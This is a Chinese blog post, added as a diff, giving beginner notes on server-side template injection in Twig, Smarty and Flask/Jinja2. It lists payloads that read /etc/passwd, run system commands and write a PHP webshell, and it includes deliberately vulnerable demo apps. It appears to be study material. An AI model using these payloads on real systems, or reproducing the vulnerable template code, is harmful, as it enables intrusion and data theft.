@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Nbc">
+    
+    <title>
+        
+            SSTI(Server-Side Template Injection)模板注入的初学习 |
+        
+        Nbc&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/violet.jpg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.5/font/css/brands.min.css">
+    
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom-1.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Nbc's Blog","author":"Nbc","avatar":"/images/violet.jpg","logo":"/images/violet.jpg","favicon":"/images/violet.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","Links":"/links","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bh.jpg","background_img_dark":"/images/yl.jpg","description":"功利主义导向的思考方式往往使我们忘却了 || 生命的本质是一场历程","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/Nbccccc/","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"nbcares@qq.com"}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"created_datetime_icon":"fa-solid fa-star"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2026,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom-1.css"],"js":[null]},"root":"","source_data":{"links":[{"name":"ZIKH26","link":"https://zikh26.github.io","description":"神之学长 我的偶像","avatar":"https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg"}]},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/violet.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Nbc&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        SSTI(Server-Side Template Injection)模板注入的初学习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/violet.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Nbc</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-star"></i>&nbsp;
+                <span class="datetime">2026-03-02 14:22:00</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Mar 02 2026 15:49:52 GMT+0800">2026-03-02 15:49:52</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Python%E5%AE%89%E5%85%A8/">Python安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>5.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>23 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="SSTI-Server-Side-Template-Injection-模板注入的初学习"><a href="#SSTI-Server-Side-Template-Injection-模板注入的初学习" class="headerlink" title="SSTI(Server-Side Template Injection)模板注入的初学习"></a>SSTI(Server-Side Template Injection)模板注入的初学习</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端信任了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。,这是SSTI的初学习，主要是Python的FlaskSSTI的学习和PHP的一些SSTI学习，PHPTWIG搭不好，只能看别的师傅的博客</strong></p>
+<h1 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h1><p> <strong>SSTI 就是服务器端模板注入（Server-Side Template Injection）</strong></p>
+<p>  模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<p>  <strong>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</strong></p>
+<p>  当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
+<p><strong>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎</strong></p>
+<h1 id="Php中的SSTI"><a href="#Php中的SSTI" class="headerlink" title="Php中的SSTI"></a>Php中的SSTI</h1><h2 id="TWIG"><a href="#TWIG" class="headerlink" title="TWIG"></a>TWIG</h2><p>常用Payload<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5" >TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span>|file_excerpt(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="built_in">map</span>(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|<span class="built_in">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>,<span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|<span class="built_in">filter</span>(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="number">0</span>,<span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]|<span class="built_in">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p><strong>模板引擎是为了让前端界面(html)与程序代码(php)分离而产生的一种解决方案，简单来说就是 html 文件里再也不用写 php 代码了。Smarty 的原理是变量替换原则，我们只需要在 html 文件里写好 Smarty 的标签即可，例如 {name}，然后调用 Smarty 的方法传递变量参数即可。</strong></p>
+<h3 id="Smarty的搭建"><a href="#Smarty的搭建" class="headerlink" title="Smarty的搭建"></a>Smarty的搭建</h3><p>下载链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/releases?page=2" >https://github.com/smarty-php/smarty/releases?page=2<i class="fas fa-external-link-alt"></i></a></p>
+<p>用的是小皮搭建的，php版本是7.3.4</p>
+<p>下载源码后引入一下Smarty.class.php文件</p>
+<p>一个简单的demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;./smarty-3.1.44/libs/SmartyBC.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="variable">$aa</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$s</span> -&gt; <span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$aa</span>)<span class="comment">//string标签是用于输出一段指定的字符串。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们可以尝试随便输入一些东西</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702190502681.png"
+                        alt="image-20230702190502681"
+                 ></p>
+<p>再试着传入{phpinfo}</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702190515784.png"
+                        alt="image-20230702190515784"
+                 ></p>
+<p>为什么会直接把phpinfo()函数执行了</p>
+<p>首先了解一下smarty里{}的作用</p>
+<ul>
+<li>输出变量</li>
+<li>执行内置函数</li>
+<li>控制语句</li>
+<li>宏定义</li>
+<li>模板注释</li>
+</ul>
+<p>也就是说我们通过控制了输入的参数的内容，而且没有被过滤，所以被当作函数执行了，我的理解是可以当eval()函数使用了，而这是字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI</p>
+<h3 id="Smarty里的SSTI"><a href="#Smarty里的SSTI" class="headerlink" title="Smarty里的SSTI"></a>Smarty里的SSTI</h3><p><strong>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)，限制了语言并不一定能阻止我们执行命令</strong></p>
+<h4 id="Smarty里有静态方法提供给我们使用"><a href="#Smarty里有静态方法提供给我们使用" class="headerlink" title="Smarty里有静态方法提供给我们使用"></a>Smarty里有静态方法提供给我们使用</h4><h5 id="getStreamVariable"><a href="#getStreamVariable" class="headerlink" title="getStreamVariable()"></a>getStreamVariable()</h5><p>在smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php文件中我们可以找到这个方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法的作用就是通过fopen打开文件拼接到result中返回结果否则就返回null</p>
+<p>所以我们就可以通过self调用静态方法构造：{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}</p>
+<p>还有Smarty_Internal_Write_File 这个类中有一个writeFile方法可以用来写Webshell：{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,”<?phpeval($_GET['cmd']); ?>“,self::clearConfig())}</p>
+<p>但是是有局限性的，这个些静态方法只适用于老版本的smarty，而新版本使用会报错，并且在3.1.30的Smarty版本中官方已经把该静态方法删除。</p>
+<h4 id="一些常规的利用"><a href="#一些常规的利用" class="headerlink" title="一些常规的利用"></a>一些常规的利用</h4><h5 id="smarty-version"><a href="#smarty-version" class="headerlink" title="{$smarty.version}"></a>{$smarty.version}</h5><p>查看版本</p>
+<h5 id="php-php"><a href="#php-php" class="headerlink" title="{php}{&#x2F;php}"></a>{php}{&#x2F;php}</h5><p>Smarty支持使用 {php}{&#x2F;php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。</p>
+<p>但是因为在Smarty3版本中已经废弃{php}标签，在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
+<p>例：{php}phpinfo();{&#x2F;php}</p>
+<h5 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h5><p>php5可用，可以让一个模板区域的字符原样输出，经常用于保护页面上的javascrip或css样式表</p>
+<p>例：<script language="php">phpinfo();</script></p>
+<h5 id="if-if"><a href="#if-if" class="headerlink" title="{if}{&#x2F;if}"></a>{if}{&#x2F;if}</h5><p>{if phpinfo()}{&#x2F;if}</p>
+<p>Smarty的{if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{&#x2F;if}</p>
+<h4 id="Smarty里的CVE"><a href="#Smarty里的CVE" class="headerlink" title="Smarty里的CVE"></a>Smarty里的CVE</h4><p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11108#toc-5" >https://xz.aliyun.com/t/11108#toc-5<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sgm4231/p/10283661.html" >https://www.cnblogs.com/sgm4231/p/10283661.html<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="Python中SSTI"><a href="#Python中SSTI" class="headerlink" title="Python中SSTI"></a>Python中SSTI</h1><h2 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入包</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="comment">#实例化一个Flask类，其中的参数 name 可以替换为其他任意字符串，可以把这句代码使用Flask模板为固定语句</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#这里是在设置页面内容，r0te装饰器起到路由的作用，简单来说就是将页面与函数绑定在了一块，对应此处代码可以这样理解:app.r0ute的参数为&quot;&quot;，即访问页面”&quot;&quot;时会自动执行随后定义的index函，我们看到的页面则是return返回的结果(此处返回的值是&quot;hel10&quot;所以页面上只会出现一句字符串he10，当然也可以返回一个html文档债得页面看上去跟符合我们平常所见)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"><span class="comment">#也可以使用render template string函数来返回一个字符串到页面上，即return render template string(&quot;hello&quot;)等价于retumn &quot;hello&#x27;</span></span><br><span class="line"><span class="comment">#t = Template(&quot;hello&quot; + name) 这行代码表示，将前端输入的name拼接到模板，此时name的输入没有经过任何检测</span></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"><span class="comment">#if__name__ == &quot;__main__&quot;这个判断条件意为当前代码不是被导入时为真，当然这个判断条件只是一个良好习债的要求，对我们在此处示范并不是必要的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702190535856.png"
+                        alt="image-20230702190535856"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702190544321.png"
+                        alt="image-20230702190544321"
+                 ></p>
+<p>可以修</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)<span class="comment">#直接固定了模板，在模板渲染之后传入数据</span></span><br><span class="line">    <span class="keyword">return</span> t.render(n=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20230702184106452.png"
+                        alt="image-20230702184106452"
+                 ></p>
